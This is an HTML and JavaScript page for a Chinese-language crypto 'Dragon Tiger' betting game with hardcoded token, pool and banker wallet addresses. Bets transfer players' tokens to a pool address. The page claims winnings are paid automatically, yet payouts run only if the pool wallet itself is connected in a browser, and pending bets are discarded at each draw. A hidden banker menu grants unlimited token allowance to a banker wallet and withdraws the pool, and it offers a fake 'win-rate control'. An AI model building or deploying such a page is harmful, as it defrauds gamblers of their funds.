<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>王者归来</title>
  <style>
    * {box-sizing:border-box;font-family:system-ui,Roboto,sans-serif}
    body {background:#0B2A23;color:#fff;margin:0;padding:0}
    .container {max-width:600px;margin:0 auto;padding:10px}
    .header {display:flex;justify-content:space-between;align-items:center;padding:10px 0}
    .title {font-size:20px;font-weight:bold}
    .btn-menu {background:none;border:none;color:#fff;font-size:24px}
    .card {background:#144A3F;border-radius:12px;padding:15px;margin-bottom:15px}
    .card-title {font-size:16px;margin-bottom:10px;color:#F0E6D2}
    .btn-connect {background:#25917A;color:#fff;border:none;padding:12px 16px;border-radius:8px;width:100%;font-weight:bold;margin-bottom:10px}
    .wallet-info {display:flex;gap:10px;margin:5px 0}
    .bet-area {display:flex;gap:10px;margin-bottom:10px}
    .bet-input {flex:2;background:#0E362E;border:1px solid #1F5F52;color:#fff;padding:10px;border-radius:8px}
    .balance-display {flex:1;background:#0E362E;border:1px solid #1F5F52;display:flex;align-items:center;justify-content:center;border-radius:8px}
    .quick-buttons {display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:10px}
    .btn-quick {background:#1F5F52;color:#F0E6D2;border:none;padding:10px;border-radius:8px}
    .odds-buttons {display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px}
    .btn-odds {border:none;padding:12px;border-radius:8px;font-weight:bold;color:#fff}
    .btn-dragon {background:#2A65CC}
    .btn-tiger {background:#D93A54}
    .btn-tie {background:#E4B449;color:#0B2A23}
    .draw-timer {font-size:28px;color:#E4B449;text-align:center;margin:10px 0}
    .btn-run {background:#E4B449;color:#0B2A23;border:none;padding:12px;border-radius:8px;width:100%;font-weight:bold}
    .trend-chart {display:flex;gap:8px;flex-wrap:wrap}
    .trend-item {padding:8px 12px;border-radius:8px;color:#fff;font-weight:bold}
    .rules {color:#ccc;font-size:14px;line-height:1.6}
    .menu {position:fixed;top:0;right:0;width:280px;height:100vh;background:#103D34;padding:20px;transform:translateX(100%);transition:transform .3s;z-index:999;overflow-y:auto}
    .menu.show {transform:translateX(0)}
    .menu-close {text-align:right;margin-bottom:20px}
    .menu-section {margin-bottom:20px}
    .menu-title {font-size:16px;margin-bottom:10px;color:#F0E6D2}
    .btn-menu-action {width:100%;background:#1F5F52;color:#F0E6D2;border:none;padding:10px;border-radius:8px;margin-bottom:8px}
    .btn-green {background:#27ae60}
    .btn-red {background:#ff3366}
    .input-menu {width:100%;background:#0E362E;border:1px solid #1F5F52;color:#fff;padding:10px;border-radius:8px;margin-bottom:8px}
    .poolBalance {color:#ffcc00}
    .hidden {display:none}
  </style>
</head>
<body>

<div class="container">
  <div class="header">
    <div class="title">🐉🐯 王者归来</div>
    <button class="btn-menu" onclick="toggleMenu()">☰</button>
  </div>

  <div class="card">
    <button class="btn-connect" onclick="connectWallet()">连接钱包</button>
    <div class="wallet-info">
      <span>地址：</span>
      <span id="addr">-</span>
    </div>
    <div class="wallet-info">
      <span>余额：</span>
      <span id="bal">-</span>
    </div>
  </div>

  <div class="card">
    <div class="card-title">下注</div>
    <div class="bet-area">
      <input class="bet-input" id="betAmt" type="number" placeholder="下注数量" value="1">
      <div class="balance-display" id="poolShow">底池加载中...</div>
    </div>
    <div class="quick-buttons">
      <button onclick="setQuick(10000)">1万</button>
      <button onclick="setQuick(100000)">10万</button>
      <button onclick="setQuick(500000)">50万</button>
      <button onclick="setQuick(1000000)">100万</button>
    </div>
    <div class="odds-buttons">
      <button class="btn-odds btn-dragon" onclick="bet(1)">龙 1:2</button>
      <button class="btn-odds btn-tiger" onclick="bet(2)">虎 1:2</button>
      <button class="btn-odds btn-tie" onclick="bet(3)">和 1:9</button>
    </div>
  </div>

  <div class="card">
    <div class="card-title">自动开奖（2分钟/期）</div>
    <div style="text-align:center">期号：<span id="round">1</span></div>
    <div class="draw-timer" id="timer">01:53</div>
    <button class="btn-run" id="autoBtn" onclick="toggleAuto()">▶️ 启动自动开奖</button>
  </div>

  <div class="card">
    <div class="card-title">开奖记录</div>
    <div class="trend-chart" id="trend"></div>
  </div>

  <div class="card">
    <div class="card-title">玩法说明</div>
    <div class="rules">
      1. 龙/虎 赔率1:2，和 赔率1:9<br>
      2. 每2分钟自动开奖<br>
      3. 中奖自动派发
    </div>
  </div>
</div>

<div class="menu" id="menu">
  <div class="menu-close">
    <button onclick="toggleMenu()">关闭</button>
  </div>

  <div class="menu-section hidden" id="withdrawSection">
    <div class="menu-title">💰 庄家提币</div>
    <button class="btn-menu-action btn-green" onclick="approve()">授权奖池</button>
    <input class="input-menu" id="withAmt" placeholder="提币数量" type="number">
    <button class="btn-menu-action btn-red" onclick="withdraw()">确认提币</button>
    <div id="poolBalance" class="poolBalance">底池：加载中</div>
  </div>

  <div class="menu-section hidden" id="controlSection">
    <div class="menu-title">🎛 胜率控制</div>
    <input class="input-menu" id="p1" value="30" placeholder="龙">
    <input class="input-menu" id="p2" value="30" placeholder="虎">
    <input class="input-menu" id="p3" value="40" placeholder="和">
    <button class="btn-menu-action" onclick="setRate()">保存</button>
  </div>
</div>

<script>
// ===================== 地址已100%填好 =====================
const TOKEN = "0x8d5be2c01616965e1bA332D7aC6a03F4CE287777";
const POOL  = "0x198e7161b25F1ccCB44c2Bf8fA13e42ffAa75785";
const B1    = "0x9a12ea21aA5373cFec05fd1095112D7F32316162";
const B2    = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
const DEC   = 18;

let account = null;
let autoRunning = false;
let round = 1;
let timeLeft = 113;
let bets = [];

// 防休眠
setInterval(()=>{try{window.focus()}catch(e){}}, 5000);

// 钱包连接
async function connectWallet() {
  if(!window.ethereum) return alert("请在钱包浏览器打开");
  try {
    const a = (await ethereum.request({method:"eth_requestAccounts"}))[0];
    account = a;
    document.getElementById("addr").innerText = a.slice(0,6)+"..."+a.slice(-4);
    refreshBalance();
    refreshPool();
    checkAdmin();
  } catch(e) { alert("连接失败："+e.message) }
}

// 余额
async function getBalance(addr) {
  const data = "0x70a08231"+addr.slice(2).padStart(64,'0');
  const res = await ethereum.request({method:"eth_call",params:[{to:TOKEN,data}]});
  return BigInt(res);
}

async function refreshBalance() {
  if(!account) return;
  const b = await getBalance(account);
  document.getElementById("bal").innerText = (Number(b)/1e18).toFixed(2);
}

async function refreshPool() {
  const b = await getBalance(POOL);
  const v = (Number(b)/1e18).toFixed(2);
  document.getElementById("poolShow").innerText = "底池："+v;
  document.getElementById("poolBalance").innerText = "底池："+v;
}

function setQuick(v) { document.getElementById("betAmt").value = v }

// 下注
async function bet(side) {
  if(!account) return alert("请先连接钱包");
  const amt = document.getElementById("betAmt").value;
  if(!amt || amt <= 0) return alert("输入有效金额");
  try {
    const val = BigInt(Math.floor(amt*1e18));
    const data = "0xa9059cbb"+POOL.slice(2).padStart(64,'0')+val.toString(16).padStart(64,'0');
    await ethereum.request({
      method:"eth_sendTransaction",
      params:[{from:account,to:TOKEN,data}]
    });
    alert("下注成功");
    bets.push({addr:account,side,amt:Number(amt)});
    refreshPool();
  } catch(e) { alert("下注失败："+e.message) }
}

// 开奖
function draw() {
  const r = Math.random();
  return r<0.3 ? 1 : r<0.6 ? 2 : 3;
}

async function settle() {
  const res = draw();
  const txt = res==1?"龙":res==2?"虎":"和";
  document.getElementById("round").innerText = ++round;
  const el = document.createElement("span");
  el.className = "trend-item trend-"+(res==1?"dragon":res==2?"tiger":"tie");
  el.innerText = txt;
  document.getElementById("trend").prepend(el);
  // 赔付逻辑只在奖池钱包执行
  if(account && account.toLowerCase() === POOL.toLowerCase()) {
    for(const b of bets) {
      if(b.side === res) {
        const pay = BigInt(Math.floor(b.amt*(res==3?9:2)*1e18));
        const data = "0xa9059cbb"+b.addr.slice(2).padStart(64,'0')+pay.toString(16).padStart(64,'0');
        try {
          await ethereum.request({method:"eth_sendTransaction",params:[{from:POOL,to:TOKEN,data}]});
        } catch(e){}
      }
    }
  }
  bets = [];
}

// 倒计时
function timer() {
  if(!autoRunning) return;
  if(timeLeft <=0) {
    timeLeft = 120;
    settle();
    return;
  }
  timeLeft--;
  const m = String(Math.floor(timeLeft/60)).padStart(2,'0');
  const s = String(timeLeft%60).padStart(2,'0');
  document.getElementById("timer").innerText = m+":"+s;
  setTimeout(timer,1000);
}

function toggleAuto() {
  autoRunning = !autoRunning;
  document.getElementById("autoBtn").innerText = autoRunning?"⏸ 停止自动":"▶️ 启动自动";
  if(autoRunning) timer();
}

// 双庄家
function isBanker() {
  if(!account) return false;
  const a = account.toLowerCase();
  return a==B1.toLowerCase() || a==B2.toLowerCase();
}

function checkAdmin() {
  const w = document.getElementById("withdrawSection");
  const c = document.getElementById("controlSection");
  if(isBanker()) {
    w.classList.remove("hidden");
    c.classList.remove("hidden");
  }
}

// 授权
async function approve() {
  if(!account || account.toLowerCase()!=POOL.toLowerCase()) return alert("请用奖池钱包连接");
  try {
    const data = "0x095ea7b3"+B1.slice(2).padStart(64,'0')+"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
    await ethereum.request({method:"eth_sendTransaction",params:[{from:account,to:TOKEN,data}]});
    alert("授权成功");
  } catch(e){ alert("授权失败："+e.message) }
}

// 提币
async function withdraw() {
  if(!isBanker()) return alert("无权限");
  const amt = document.getElementById("withAmt").value;
  if(!amt || amt<=0) return alert("输入数量");
  try {
    const val = BigInt(Math.floor(amt*1e18));
    const data = "0x23b872dd"+POOL.slice(2).padStart(64,'0')+account.slice(2).padStart(64,'0')+val.toString(16).padStart(64,'0');
    await ethereum.request({method:"eth_sendTransaction",params:[{from:account,to:TOKEN,data}]});
    alert("提币成功");
    refreshPool();
  } catch(e){ alert("提币失败："+e.message) }
}

function setRate() { alert("已保存胜率") }

function toggleMenu() {
  document.getElementById("menu").classList.toggle("show");
}

// 初始化
refreshPool();
</script>
</body>
</html>
